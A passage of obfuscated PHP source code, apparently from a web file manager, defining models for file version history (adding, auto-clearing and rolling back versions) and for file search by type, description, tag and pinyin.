$a‘öÛœ‡¸ç[$fĞÄæ‹İÙ²[$A¼è¹í„î[400]][$A¼è¹í„î[1008]]]; $fĞÄæ‹İÙ²[$A¼è¹í„î[400]][$A¼è¹í„î[1009]] = $a‘öÛœ‡¸ç[$fĞÄæ‹İÙ²[$A¼è¹í„î[400]][$A¼è¹í„î[1009]]]; } if ($fĞÄæ‹İÙ²[$A¼è¹í„î[29]] == $A¼è¹í„î[2259] && isset($fĞÄæ‹İÙ²[$A¼è¹í„î[400]][$A¼è¹í„î[365]])) { $fĞÄæ‹İÙ²[$A¼è¹í„î[400]][$A¼è¹í„î[365]] = $a‘öÛœ‡¸ç[$fĞÄæ‹İÙ²[$A¼è¹í„î[400]][$A¼è¹í„î[365]]]; } $fĞÄæ‹İÙ²[$A¼è¹í„î[387]] = $a‘öÛœ‡¸ç[$fĞÄæ‹İÙ²[$A¼è¹í„î[365]]]; $fĞÄæ‹İÙ²[$A¼è¹í„î[2264]] = $a‘öÛœ‡¸ç[$fĞÄæ‹İÙ²[$A¼è¹í„î[2251]]]; if ($fĞÄæ‹İÙ²[$A¼è¹í„î[29]] == $A¼è¹í„î[2047]) { $fĞÄæ‹İÙ²[$A¼è¹í„î[2264]] = $fĞÄæ‹İÙ²[$A¼è¹í„î[387]]; $fĞÄæ‹İÙ²[$A¼è¹í„î[2251]] = $fĞÄæ‹İÙ²[$A¼è¹í„î[2264]][$A¼è¹í„î[365]]; $fĞÄæ‹İÙ²[$A¼è¹í„î[387]] = !1; $fĞÄæ‹İÙ²[$A¼è¹í„î[365]] = $A¼è¹í„î[33]; } $fĞÄæ‹İÙ²[$A¼è¹í„î[2217]] = $eÉ­Â’ø‘[$fĞÄæ‹İÙ²[$A¼è¹í„î[1417]]]; } $A¯ƒØ™Ó†İ[$A¼è¹í„î[350]] = $Eáº‘¯ĞÛ; goto DÃ¹§Œ¬­; fßÁÀïñ¦—: $B…ÑİÕÕæ = array_unique($B…ÑİÕÕæ); $B§øæŸã‘ = array_unique(array_to_keyvalue($Eáº‘¯ĞÛ, $A¼è¹í„î[33], $A¼è¹í„î[1417])); $eÉ­Â’ø‘ = Model($A¼è¹í„î[472])->userListInfo($B§øæŸã‘); goto FƒÖâïÏ´Ó; BĞ‚²µ§×Æ: $A¼è¹í„î =& $_SERVER[Õİõş]; $Eáº‘¯ĞÛ = $A¯ƒØ™Ó†İ[$A¼è¹í„î[350]]; $B…ÑİÕÕæ = array_to_keyvalue($Eáº‘¯ĞÛ, $A¼è¹í„î[33], $A¼è¹í„î[365]); goto DàçºÄææ†; DÃ¹§Œ¬­: return $A¯ƒØ™Ó†İ; goto A”á“Å‘ ã; A”á“Å‘ ã: } public function removeBySource($e£‚İô•›î) { $d¬×ËÚ•† = array($_SERVER[Õİõş][379] => $e£‚İô•›î); $this->where($d¬×ËÚ•†)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\x65\137\x68\151\x73\164\x6f\162\171"; public function addHistory($Cöê› ‹¥Ú, $EÁØ„™Ã = '') { $fÎïœÓ‹‹» =& $_SERVER[Õİõş]; $AˆšäœÇİŞ = array($fÎïœÓ‹‹»[379] => $Cöê› ‹¥Ú[$fÎïœÓ‹‹»[365]], $fÎïœÓ‹‹»[1408] => isset($Cöê› ‹¥Ú[$fÎïœÓ‹‹»[375]]) ? $Cöê› ‹¥Ú[$fÎïœÓ‹‹»[375]] : $Cöê› ‹¥Ú[$fÎïœÓ‹‹»[374]], $fÎïœÓ‹‹»[415] => $Cöê› ‹¥Ú[$fÎïœÓ‹‹»[414]], $fÎïœÓ‹‹»[515] => $Cöê› ‹¥Ú[$fÎïœÓ‹‹»[77]], $fÎïœÓ‹‹»[2265] => $EÁØ„™Ã); $CèïÃ‘ÕÈ— = $GLOBALS[$fÎïœÓ‹‹»[6]][$fÎïœÓ‹‹»[84]][$fÎïœÓ‹‹»[2266]]; if ($CèïÃ‘ÕÈ— > 1) { $this->historyAutoClear($AˆšäœÇİŞ[$fÎïœÓ‹‹»[365]]); $this->add($AˆšäœÇİŞ); } Model($fÎïœÓ‹‹»[2267])->eventFileEdit($Cöê› ‹¥Ú[$fÎïœÓ‹‹»[365]]); } private function historyAutoClear($E†‘Ô”Â®Ü) { goto a“¢äˆ‚ñ£; a“¢äˆ‚ñ£: $fåÒƒ¨ù¤Ó =& $_SERVER[Õİõş]; $fÅÄö®äŒŞ = Model($fåÒƒ¨ù¤Ó[1091])->get($fåÒƒ¨ù¤Ó[2268]); $C§ÏÓ‘âš = $GLOBALS[$fåÒƒ¨ù¤Ó[6]][$fåÒƒ¨ù¤Ó[84]][$fåÒƒ¨ù¤Ó[2266]]; goto b¬ñî•Û¦; dªø»¹Ÿ®œ: $c¹àñë©‡¶ = array($fåÒƒ¨ù¤Ó[381] => array($fåÒƒ¨ù¤Ó[7], $e ’¿ë“ø)); $this->where($c¹àñë©‡¶)->delete(); Model($fåÒƒ¨ù¤Ó[417])->remove($BÏƒÆîøöÈ); goto BàŒÊ´†©Î; e‰Ó»ÁŸ…Š: if (!$dĞİÈöˆÑ° || $CŸ¿Ûİâõ“ >= count($dĞİÈöˆÑ°)) { return; } $e ’¿ë“ø = array_to_keyvalue($dĞİÈöˆÑ°, $fåÒƒ¨ù¤Ó[33], $fåÒƒ¨ù¤Ó[363]); $e ’¿ë“ø = array_slice($e ’¿ë“ø, $CŸ¿Ûİâõ“); goto a¢‹‹ŒĞ×; B“Ä´¶îË“: if ($CŸ¿Ûİâõ“ >= 500) { return; } $c¹àñë©‡¶ = array($fåÒƒ¨ù¤Ó[379] => $E†‘Ô”Â®Ü); $dĞİÈöˆÑ° = $this->field($fåÒƒ¨ù¤Ó[2270])->where($c¹àñë©‡¶)->order($fåÒƒ¨ù¤Ó[2262])->select(); goto e‰Ó»ÁŸ…Š; b¬ñî•Û¦: $B‰ğ¨¢Š‚‡ = $fÅÄö®äŒŞ == $fåÒƒ¨ù¤Ó[2269] ? 3 : $C§ÏÓ‘âš; if ($C§ÏÓ‘âš <= 1) { $B‰ğ¨¢Š‚‡ = 1; } $CŸ¿Ûİâõ“ = $B‰ğ¨¢Š‚‡ - 1; goto B“Ä´¶îË“; a¢‹‹ŒĞ×: $BÏƒÆîøöÈ = array_to_keyvalue($dĞİÈöˆÑ°, $fåÒƒ¨ù¤Ó[33], $fåÒƒ¨ù¤Ó[414]); $BÏƒÆîøöÈ = array_slice($BÏƒÆîøöÈ, $CŸ¿Ûİâõ“); if (!$e ’¿ë“ø || !$BÏƒÆîøöÈ) { return; } goto dªø»¹Ÿ®œ; BàŒÊ´†©Î: } public function listData($d„÷­¼¼ ) { goto Cæ»½ÏœœÁ; Cæ»½ÏœœÁ: $D¬ñƒÓ½­ =& $_SERVER[Õİõş]; $c…¯ù÷ËŸŠ = array($D¬ñƒÓ½­[379] => $d„÷­¼¼ ); $cõ¨Ÿğ®Óí = $D¬ñƒÓ½­[2271]; goto B“¿™©˜‹½; dºÒ°¢îìÇ: $dšíâºï™ = 3; if ($b–ë´¬œ– == $D¬ñƒÓ½­[2269]) { $Eå„ÒÜÓŒ[$D¬ñƒÓ½­[350]] = array_slice($Eå„ÒÜÓŒ[$D¬ñƒÓ½­[350]], 0, $dšíâºï™); $Eå„ÒÜÓŒ[$D¬ñƒÓ½­[347]] = array($D¬ñƒÓ½­[2272] => 1, $D¬ñƒÓ½­[2273] => 20, $D¬ñƒÓ½­[2274] => 1, $D¬ñƒÓ½­[2275] => count($Eå„ÒÜÓŒ[$D¬ñƒÓ½­[350]])); } return $Eå„ÒÜÓŒ; goto DÚ‹˜¹¸¤; B“¿™©˜‹½: $Eå„ÒÜÓŒ = $this->field($cõ¨Ÿğ®Óí)->where($c…¯ù÷ËŸŠ)->order($D¬ñƒÓ½­[2262])->selectPage(); $this->_listAppendUser($Eå„ÒÜÓŒ[$D¬ñƒÓ½­[350]]); $b–ë´¬œ– = Model($D¬ñƒÓ½­[1091])->get($D¬ñƒÓ½­[2268]); goto dºÒ°¢îìÇ; DÚ‹˜¹¸¤: } protected function _listAppendUser(&$C×™ôß´é) { $DíĞŒË‰ç =& $_SERVER[Õİõş]; $eğäêÅÓ›ß = array_to_keyvalue($C×™ôß´é, $DíĞŒË‰ç[33], $DíĞŒË‰ç[1417]); $A”–Š¶¦Û = Model($DíĞŒË‰ç[472])->userListInfo($eğäêÅÓ›ß); foreach ($C×™ôß´é as &$e¿‚ï¹Àá) { $a‚ßÎ÷ğ¥ò = $e¿‚ï¹Àá[$DíĞŒË‰ç[1417]]; $e¿‚ï¹Àá[$DíĞŒË‰ç[374]] = $A”–Š¶¦Û[$a‚ßÎ÷ğ¥ò] ? $A”–Š¶¦Û[$a‚ßÎ÷ğ¥ò] : !1; } } public function fileInfo($E²áÙŒ¾Ş¤) { $Eç¬‚§ñÒ =& $_SERVER[Õİõş]; $A¬ÔëÈˆÅ = $this->tablePrefix; $a¯ÓŞà¶¼µ = "{$A¬ÔëÈˆÅ}\151\x6f\137\146\x69\154\145\40\x66\x69\x6c\145\163\x20\x6f\x6e\40\x66\x69\154\x65\163\x2e\x66\151\x6c\145\111\x44\x20\x3d\40\150\x69\x73\x74\x6f\162\x79\56\x66\151\x6c\x65\x49\104"; return $this->alias($Eç¬‚§ñÒ[2276])->where(array($Eç¬‚§ñÒ[381] => $E²áÙŒ¾Ş¤))->join($a¯ÓŞà¶¼µ, $Eç¬‚§ñÒ[2277])->find(); } public function removeItem($Dõèø¿ ã) { $EÂÒ„ğÖô˜ =& $_SERVER[Õİõş]; $cˆ˜§ˆºë¥ = array($EÂÒ„ğÖô˜[381] => $Dõèø¿ ã); $bŠËŞêŒ® = $this->where($cˆ˜§ˆºë¥)->find(); if ($bŠËŞêŒ®) { $DØ¥ÙËĞ = $this->where($cˆ˜§ˆºë¥)->delete(); Model($EÂÒ„ğÖô˜[417])->remove($bŠËŞêŒ®[$EÂÒ„ğÖô˜[414]]); return $DØ¥ÙËĞ; } return !1; } public function removeBySource($E†™î™¬Ÿ¬) { goto F‰›ÆË‹¥; F‰›ÆË‹¥: $aÂâ·èª¡ô =& $_SERVER[Õİõş]; if (!$E†™î™¬Ÿ¬) { return !1; } if (!is_array($E†™î™¬Ÿ¬)) { $E†™î™¬Ÿ¬ = array($E†™î™¬Ÿ¬); } goto DÛØãÉ°ˆ›; aÜ×Šõ‡•: return !0; goto dä‰É‡ÁÙŞ; DÛØãÉ°ˆ›: $d¼Š¯Ö§îÂ = array($aÂâ·èª¡ô[379] => array($aÂâ·èª¡ô[7], $E†™î™¬Ÿ¬)); $c¾ƒĞæ„¬ = $this->field($aÂâ·èª¡ô[415])->where($d¼Š¯Ö§îÂ)->select(); if ($c¾ƒĞæ„¬) { $this->where($d¼Š¯Ö§îÂ)->delete(); $eíéÑùÆŒ£ = array_to_keyvalue($c¾ƒĞæ„¬, $aÂâ·èª¡ô[33], $aÂâ·èª¡ô[414]); Model($aÂâ·èª¡ô[417])->remove($eíéÑùÆŒ£); } goto aÜ×Šõ‡•; dä‰É‡ÁÙŞ: } public function setDetail($aÏíºó½¬, $fòÉ„ƒÚˆ) { $A¢¦ñÔó =& $_SERVER[Õİõş]; return $this->where(array($A¢¦ñÔó[381] => $aÏíºó½¬))->save(array($A¢¦ñÔó[2265] => $fòÉ„ƒÚˆ)); } public function rollbackToItem($dùš†ÊóÒŠ, $AœßÄéÖˆç) { goto AİíÆÕ; AİíÆÕ: $Aá¸³Æš« =& $_SERVER[Õİõş]; $f®âÊ¾›¨¾ = Model($Aá¸³Æš«[754])->sourceInfo($dùš†ÊóÒŠ); $this->addHistory($f®âÊ¾›¨¾); goto fÄˆÚµ·±•; eÛ»åÒìà‡: return $this->where(array($Aá¸³Æš«[381] => $AœßÄéÖˆç))->delete(); goto dÆ¼»ÂÈù; fÄˆÚµ·±•: $D‡™®ÛÑÖÑ = $this->find($AœßÄéÖˆç); $DÎäêØ´œ = array($Aá¸³Æš«[414] => $D‡™®ÛÑÖÑ[$Aá¸³Æš«[414]], $Aá¸³Æš«[77] => $D‡™®ÛÑÖÑ[$Aá¸³Æš«[77]], $Aá¸³Æš«[106] => time(), $Aá¸³Æš«[375] => USER_ID); Model($Aá¸³Æš«[754])->where(array($Aá¸³Æš«[365] => $dùš†ÊóÒŠ))->save($DÎäêØ´œ); goto eÛ»åÒìà‡; dÆ¼»ÂÈù: } public function clearSame($DÃæÁ¡ò¢É) { goto B§í„‡¿‚; DªŠğ»Ø„: $AùùÃéÛÂ = array(); $EÛ¦Ë·¦•ê = array(); foreach ($Eµ°±Åå as $E³˜ù„ºâØ) { if (!$E³˜ù„ºâØ || count($E³˜ù„ºâØ) <= 1) { continue; } foreach ($E³˜ù„ºâØ as $AÃô¤‰²òå) { $AùùÃéÛÂ[] = $AÃô¤‰²òå[$EÑ˜…ù«¹¥[414]]; $EÛ¦Ë·¦•ê[] = $AÃô¤‰²òå[$EÑ˜…ù«¹¥[363]]; } } goto bàì‡·ƒƒ¨; B§í„‡¿‚: $EÑ˜…ù«¹¥ =& $_SERVER[Õİõş]; $d¯ŞƒØÅöÅ = $this->listData($DÃæÁ¡ò¢É); $Eµ°±Åå = array_to_keyvalue_group($d¯ŞƒØÅöÅ, $EÑ˜…ù«¹¥[414]); goto DªŠğ»Ø„; bàì‡·ƒƒ¨: if (!$EÛ¦Ë·¦•ê) { return; } $this->where(array($EÑ˜…ù«¹¥[363] => array($EÑ˜…ù«¹¥[7], $EÛ¦Ë·¦•ê)))->delete(); Model($EÑ˜…ù«¹¥[417])->remove($AùùÃéÛÂ); goto aËÉ£Ö§çæ; aËÉ£Ö§çæ: } public function userSpace() { $C… ­åùì =& $_SERVER[Õİõş]; $fİó‡ƒÌ = $this->tablePrefix; $dğÊ›œ’ª® = array($C… ­åùì[1408] => USER_ID); $D†”Ü„ = "{$fİó‡ƒÌ}\151\157\137\146\151\x6c\145\40\146\x69\154\x65\163\40\157\156\40\146\151\154\x65\x73\x2e\146\x69\x6c\145\111\104\40\75\40\x68\x69\x73\x74\x6f\162\171\x2e\146\x69\x6c\145\x49\x44"; return $this->alias($C… ­åùì[2276])->where($dğÊ›œ’ª®)->join($D†”Ü„, $C… ­åùì[2277])->sum($C… ­åùì[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($dîëò§“¸) { goto a¯¿ ²Åê³; ağ˜Õî¬Á‰: if (!$e±Æˆ‰îÙ¬) { return array(); } $C¨éÜ¸ãÄ» = $e±Æˆ‰îÙ¬[$DÄø©ğ×¼‚[156]]; $D·Íïš…²Í = $DÄø©ğ×¼‚[7]; goto cµ˜¯«¦ßÈ; cµ˜¯«¦ßÈ: if (!$e±Æˆ‰îÙ¬[$DÄø©ğ×¼‚[156]]) { $dâòí”¿‹ = array_to_keyvalue($AÕöŸ¯Œ„È, $DÄø©ğ×¼‚[33], $DÄø©ğ×¼‚[156]); $C¨éÜ¸ãÄ» = implode($DÄø©ğ×¼‚[47], $dâòí”¿‹); $D·Íïš…²Í = $DÄø©ğ×¼‚[2234]; } $AÇœ‘à™ê = explode($DÄø©ğ×¼‚[47], trim($C¨éÜ¸ãÄ», $DÄø©ğ×¼‚[47])); return array($D·Íïš…²Í, $AÇœ‘à™ê); goto d­ÜÃøñå; a¯¿ ²Åê³: $DÄø©ğ×¼‚ =& $_SERVER[Õİõş]; $AÕöŸ¯Œ„È = KodIO::fileTypeList(); $e±Æˆ‰îÙ¬ = $AÕöŸ¯Œ„È[$dîëò§“¸]; goto ağ˜Õî¬Á‰; d­ÜÃøñå: } public function listPathType($dœÖäğÊÊÁ) { $FÊ’âšÛˆ… =& $_SERVER[Õİõş]; $dê·ôè Ü½ = $this->fileTypeWhere($dœÖäğÊÊÁ); if (!$dê·ôè Ü½) { return array(); } $fù­¬Œ…¿‘ = array($FÊ’âšÛˆ…[516] => SourceModel::TYPE_USER, $FÊ’âšÛˆ…[517] => USER_ID, $FÊ’âšÛˆ…[513] => 0, $FÊ’âšÛˆ…[514] => $dê·ôè Ü½); return $this->listSource($fù­¬Œ…¿‘); } public function listSearch($C¤„Øòô”, $Fñ½Õ…í¯ï = 300) { goto eéô›Õ¸; eéô›Õ¸: $B‚Ë›¾Ùğ =& $_SERVER[Õİõş]; if (isset($C¤„Øòô”[$B‚Ë›¾Ùğ[2156]]) && $C¤„Øòô”[$B‚Ë›¾Ùğ[2156]]) { $C¤„Øòô”[$B‚Ë›¾Ùğ[2156]] = str_replace($B‚Ë›¾Ùğ[1569], $B‚Ë›¾Ùğ[2278], trim($C¤„Øòô”[$B‚Ë›¾Ùğ[2156]])); } $dÛ×µÑ×áÏ = $this->_parseSearchWhere($C¤„Øòô”); goto fÀ‚ŞÔˆËš; fÀ‚ŞÔˆËš: if (!isset($dÛ×µÑ×áÏ[$B‚Ë›¾Ùğ[392]])) { $dÛ×µÑ×áÏ[$B‚Ë›¾Ùğ[392]] = 0; } $AÉ¨´–Ìæˆ = $B‚Ë›¾Ùğ[2279]; $C§©¿½–‘” = $AÉ¨´–Ìæˆ; goto F†¢’½‡Æó; F†¢’½‡Æó: $this->_listSearchBindPinyin($C¤„Øòô”, $dÛ×µÑ×áÏ, $AÉ¨´–Ìæˆ); $this->alias($B‚Ë›¾Ùğ[482])->_makeOrder()->cache(null, 10); $f½¿±ÌÁö = $this->distinct(!0)->field($AÉ¨´–Ìæˆ)->where($dÛ×µÑ×áÏ)->selectPage($Fñ½Õ…í¯ï); goto e‹˜¯ÕÚäè; e‹˜¯ÕÚäè: $this->_listSearchDesc($f½¿±ÌÁö, $C¤„Øòô”, $C§©¿½–‘”); $this->_listSearchTag($f½¿±ÌÁö, $C¤„Øòô”, $C§©¿½–‘”); $this->_listDataApply($f½¿±ÌÁö[$B‚Ë›¾Ùğ[350]]); goto b«ßªø´¶‚; b«ßªø´¶‚: $this->_listMake($f½¿±ÌÁö); return $f½¿±ÌÁö; goto fÖ¼»åïŒË; fÖ¼»åïŒË: } private function _listSearchTag(&$EóÆµöŸ¥, $fâ„ƒßÄ¦¡, $B¶çèˆ‚…Š) { goto CğÚé¯…¼å; c”ßÆ‹ÛÏĞ: $a‡¤÷ß»Ö = array_to_keyvalue($a‡¤÷ß»Ö, $BÇ­Û—™Ì[33], $BÇ­Û—™Ì[75]); $däñí¨ÌÒœ = array_unique($a‡¤÷ß»Ö); $this->_listSearchMerge($EóÆµöŸ¥, $fâ„ƒßÄ¦¡, $B¶çèˆ‚…Š, $däñí¨ÌÒœ); goto cöÌˆ«÷˜³; CğÚé¯…¼å: $BÇ­Û—™Ì =& $_SERVER[Õİõş]; if (!$fâ„ƒßÄ¦¡[$BÇ­Û—™Ì[2156]] || $EóÆµöŸ¥[$BÇ­Û—™Ì[347]][$BÇ­Û—™Ì[336]] > 1) { return; } $Dİ¤†áàÚ = Model($BÇ­Û—™Ì[2280])->listData(); goto a‘§ÆÕ£ƒ; a‘§ÆÕ£ƒ: $Fº–’ÅŸ = array(); $fô¾˜§¢İ‚ = $fâ„ƒßÄ¦¡[$BÇ­Û—™Ì[2156]]; foreach ($Dİ¤†áàÚ as $cĞĞÄšê©´) { $A£ÙÏ¤×Ï… = $cĞĞÄšê©´[$BÇ­Û—™Ì[28]]; $eĞŠÂ‚×çö = str_replace($BÇ­Û—™Ì[50], $BÇ­Û—™Ì[33], Pinyin::encode($A£ÙÏ¤×Ï…)); if (stripos($A£ÙÏ¤×Ï…, $fô¾˜§¢İ‚) !== !1 || stripos($eĞŠÂ‚×çö, $fô¾˜§¢İ‚) !== !1) { $Fº–’ÅŸ[] = $cĞĞÄšê©´[$BÇ­Û—™Ì[363]]; } } goto f„å„¸ªÁŒ; f„å„¸ªÁŒ: if (!$Fº–’ÅŸ) { return; } $CëÓÚõ”•í = array($BÇ­Û—™Ì[389] => array($BÇ­Û—™Ì[7], $Fº–’ÅŸ)); $a‡¤÷ß»Ö = Model($BÇ­Û—™Ì[2281])->field($BÇ­Û—™Ì[75])->where($CëÓÚõ”•í)->select(); goto c”ßÆ‹ÛÏĞ; cöÌˆ«÷˜³: } private function _listSearchDesc(&$EÇ÷ÊÆÌâ, $Aëù„×…ÁÆ, $bø’¤µ‘ƒõ) { goto aèëÀ‹‘Ãõ; a’²“·Ç§É: $BÔ¢àÎ„ç  = Model($A„ÈÕÍññ[499])->field($A„ÈÕÍññ[365])->where($CŞæ³ñØ¹)->select(); $F›¥½ñºÔ‘ = array_to_keyvalue($BÔ¢àÎ„ç , $A„ÈÕÍññ[33], $A„ÈÕÍññ[365]); $this->_listSearchMerge($EÇ÷ÊÆÌâ, $Aëù„×…ÁÆ, $bø’¤µ‘ƒõ, $F›¥½ñºÔ‘); goto Cİ‰Ï…§¬è; aèëÀ‹‘Ãõ: $A„ÈÕÍññ =& $_SERVER[Õİõş]; if (!$Aëù„×…ÁÆ[$A„ÈÕÍññ[2156]] || $EÇ÷ÊÆÌâ[$A„ÈÕÍññ[347]][$A„ÈÕÍññ[336]] > 1) { return; } $DÃ×¬†…ÁÌ = $this->listSearchChildren($Aëù„×…ÁÆ[$A„ÈÕÍññ[456]]); goto b¤ßÈ¨´š; b¤ßÈ¨´š: $DÃ×¬†…ÁÌ = array_unique($DÃ×¬†…ÁÌ); if (!$DÃ×¬†…ÁÌ) { return; } $CŞæ³ñØ¹ = array($A„ÈÕÍññ[365] => array($A„ÈÕÍññ[7], $DÃ×¬†…ÁÌ), $A„ÈÕÍññ[89] => $A„ÈÕÍññ[400], $A„ÈÕÍññ[355] => array($A„ÈÕÍññ[753], $A„ÈÕÍññ[2158] . $Aëù„×…ÁÆ[$A„ÈÕÍññ[2156]] . $A„ÈÕÍññ[2158])); goto a’²“·Ç§É; Cİ‰Ï…§¬è: } private function _listSearchMerge(&$CÍÑïÎ¥Äè, $CÅ½®óèˆ, $a§ó–òœìÓ, $b÷°á‚Ê™ñ) { goto DØÓÌ¡‘­Ö; bøÉ‰ Îœâ: foreach ($eĞØºø¤®É as $Aí˜¶ß‰Ã“) { $E›È‰âá›¥ = $eïºæ§£êˆ[47] . $CÅ½®óèˆ[$eïºæ§£êˆ[456]] . $eïºæ§£êˆ[47]; if (stripos($Aí˜¶ß‰Ã“[$eïºæ§£êˆ[454]], $E›È‰âá›¥) !== !1) { $C¶œ¥ìÖ²½[] = $Aí˜¶ß‰Ã“; } } $CÍÑïÎ¥Äè[$eïºæ§£êˆ[350]] = array_merge($C¶œ¥ìÖ²½, $CÍÑïÎ¥Äè[$eïºæ§£êˆ[350]]); $CÍÑïÎ¥Äè[$eïºæ§£êˆ[347]][$eïºæ§£êˆ[348]] += count($C¶œ¥ìÖ²½); goto eãÍáàåÁ; a»ÈÜ¡æºÑ: $cï†áä²Š˜ = array_diff($b÷°á‚Ê™ñ, $f†¸Â¯Š¬œ); if (!$cï†áä²Š˜) { return; } $Bä¹·ÇŸáŸ = array($eïºæ§£êˆ[365] => array($eïºæ§£êˆ[7], $cï†áä²Š˜)); goto DÛÑôÙÚ; DØÓÌ¡‘­Ö: $eïºæ§£êˆ =& $_SERVER[Õİõş]; if (!$b÷°á‚Ê™ñ) { return; } $f†¸Â¯Š¬œ = array_to_keyvalue($CÍÑïÎ¥Äè[$eïºæ§£êˆ[350]], $eïºæ§£êˆ[33], $eïºæ§£êˆ[365]); goto a»ÈÜ¡æºÑ; DÛÑôÙÚ: $eĞØºø¤®É = $this->field($a§ó–òœìÓ)->where($Bä¹·ÇŸáŸ)->select(); if (!$eĞØºø¤®É) { return; } $C¶œ¥ìÖ²½ = array(); goto bøÉ‰ Îœâ; eãÍáàåÁ: } public function listSearchChildren($CŒäí¡ºÏ“, $bäñ´òÓ¼’ = 5000) { goto D´Êá“Õã®; D´Êá“Õã®: $CëÙŠÕÉÚ¥ =& $_SERVER[Õİõş]; $f¿”÷ï÷í = array(); $E™æùœ¨§¼ = $this->sourceInfo($CŒäí¡ºÏ“); goto FãË»ÌÅùÜ; FãË»ÌÅùÜ: $AŠè‘ˆÓòË = array($CëÙŠÕÉÚ¥[454] => array($CëÙŠÕÉÚ¥[753], $E™æùœ¨§¼[$CëÙŠÕÉÚ¥[454]] . $E™æùœ¨§¼[$CëÙŠÕÉÚ¥[365]] . $CëÙŠÕÉÚ¥[479])); $A‘œ“›Âí = $this->field($CëÙŠÕÉÚ¥[365])->cache(null, 600)->where($AŠè‘ˆÓòË)->count(); if ($A‘œ“›Âí > $bäñ´òÓ¼’) { return $this->_listSearchChildrenNear($CŒäí¡ºÏ“, $bäñ´òÓ¼’); } goto aÁŸ»»ùˆ®; aÁŸ»»ùˆ®: $F°Ø©ÑÙ¬Ò = $this->field($CëÙŠÕÉÚ¥[365])->where($AŠè‘ˆÓòË)->select(); $f¿”÷ï÷í = array_to_keyvalue($F°Ø©ÑÙ¬Ò, $CëÙŠÕÉÚ¥[33], $CëÙŠÕÉÚ¥[365]); return $f¿”÷ï÷í; goto Fß­Äƒ¾»†; Fß­Äƒ¾»†: } private function _listSearchChildrenNear($fÃÒÔä‰Ôª, $EäË®´©‘­) { goto e©Ã‘›ÏÚˆ; e©Ã‘›ÏÚˆ: $bÊ‡‚ùŒÔŸ =& $_SERVER[Õİõş]; $AÈ¥é÷‰‹ì = array(); $A™‘õ™²‹Ö = array($bÊ‡‚ùŒÔŸ[456] => $fÃÒÔä‰Ôª); goto Eë²í“ˆŠƒ; CñÒñ„Û›: if (!$B‹·ÁÚ×¤ù) { return $AÈ¥é÷‰‹ì; } $A™‘õ™²‹Ö = array($bÊ‡‚ùŒÔŸ[456] => array($bÊ‡‚ùŒÔŸ[7], $B‹·ÁÚ×¤ù)); $A˜‹´¾ì×… = $this->field($bÊ‡‚ùŒÔŸ[2282])->where($A™‘õ™²‹Ö)->select(); goto CÈ°Ò¥Û­; CÈ°Ò¥Û­: $AÈ¥é÷‰‹ì = array_merge($AÈ¥é÷‰‹ì, array_to_keyvalue($A˜‹´¾ì×…, $bÊ‡‚ùŒÔŸ[33], $bÊ‡‚ùŒÔŸ[365])); $AÈ¥é÷‰‹ì = array_slice($AÈ¥é÷‰‹ì, 0, $EäË®´©‘­); return $AÈ¥é÷‰‹ì; goto EÒï‘ìîªÒ; Eë²í“ˆŠƒ: $A˜‹´¾ì×… = $this->field($bÊ‡‚ùŒÔŸ[2282])->where($A™‘õ™²‹Ö)->select(); $B‹·ÁÚ×¤ù = array_to_keyvalue(array_filter_by_field($A˜‹´¾ì×…, $bÊ‡‚ùŒÔŸ[366], $bÊ‡‚ùŒÔŸ[83]), $bÊ‡‚ùŒÔŸ[33], $bÊ‡‚ùŒÔŸ[365]); $AÈ¥é÷‰‹ì = array_merge($AÈ¥é÷‰‹ì, array_to_keyvalue($A˜‹´¾ì×…, $bÊ‡‚ùŒÔŸ[33], $bÊ‡‚ùŒÔŸ[365])); goto CñÒñ„Û›; EÒï‘ìîªÒ: } private function _listSearchBindPinyin($AÒï±¤§Ñ, &$bÀòÎÎ‡ÉÎ, &$d’ÍÁĞ¡Ú†) { goto a©¯¦Àïª; D’¦¦ö“: $f¿©·›¹Ê„ = array(); $d’ÍÁĞ¡Ú† = str_replace(array($B‰––‡ª[213], $B‰––‡ª[50], $B‰––‡ª[2283]), $B‰––‡ª[33], $d’ÍÁĞ¡Ú†); $d’ÍÁĞ¡Ú† = $B‰––‡ª[2284] . str_replace($B‰––‡ª[47], $B‰––‡ª[2285], $d’ÍÁĞ¡Ú†); goto cî£Ôä©‰â; a©¯¦Àïª: $B‰––‡ª =& $_SERVER[Õİõş]; if (!Input::check($AÒï±¤§Ñ[$B‰––‡ª[2156]], $B‰––‡ª[302]) || strlen($AÒï±¤§Ñ[$B‰––‡ª[2156]]) < 2) { return; } $CÓìÀÅòÇ½ = "\114\x45\106\124\40\112\x4f\111\116\x20{$this->tablePrefix}\151\x6f\137\x73\157\x75\x72\143\145\x5f\x6d\145\164\x61\40\155\145\x74\x61\x20\x6f\x6e\x20\163\x6f\165\162\x63\x65\x2e\x73\157\165\162\x63\145\111\x44\40\x3d\40\x6d\145\164\x61\x2e\163\x6f\x75\x72\143\145\111\104"; goto D’¦¦ö“; cî£Ôä©‰â: unset($bÀòÎÎ‡ÉÎ[$B‰––‡ª[28]]); foreach ($bÀòÎÎ‡ÉÎ as $E‡ªÙİ”Á‹ => $B–¯ä°ÓÊê) { $f¿©·›¹Ê„[$B‰––‡ª[2284] . $E‡ªÙİ”Á‹] = $B–¯ä°ÓÊê; } $a›—™©ƒƒ = array($B‰––‡ª[478], $B‰––‡ª[2158] . $AÒï±¤§Ñ[$B‰––‡ª[2156]] . $B‰––‡ª[2158]); goto f±¹“ç•³«; f±¹“ç•³«: $f¿©·›¹Ê„[] = array($B‰––‡ª[2286] => $a›—™©ƒƒ, $B‰––‡ª[918] => $B‰––‡ª[2160], array($B‰––‡ª[2287] => $a›—™©ƒƒ, $B‰––‡ª[2288] => array($B‰––‡ª[7], array($B‰––‡ª[411], $B‰––‡ª[410])))); $this->join($CÓìÀÅòÇ½); $bÀòÎÎ‡ÉÎ = $f¿©·›¹Ê„; goto F¡£ò„²ã; F¡£ò„²ã: } private function _parseSearchWhere($Fìî»¶Å‰›) { goto cÜ´¡Ø‡ ë; dî¬öÒêÚæ: if (isset($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[2156]]) && $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[2156]]) { $D¶¨ÚçäØ· = $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[2156]]; $C„ˆ¸Ãï± = explode($F‡Ü¡èĞ²Ì[50], $D¶¨ÚçäØ·); if (strlen($D¶¨ÚçäØ·) > 2 && (substr($D¶¨ÚçäØ·, 0, 1) == $F‡Ü¡èĞ²Ì[112] && substr($D¶¨ÚçäØ·, -1) == 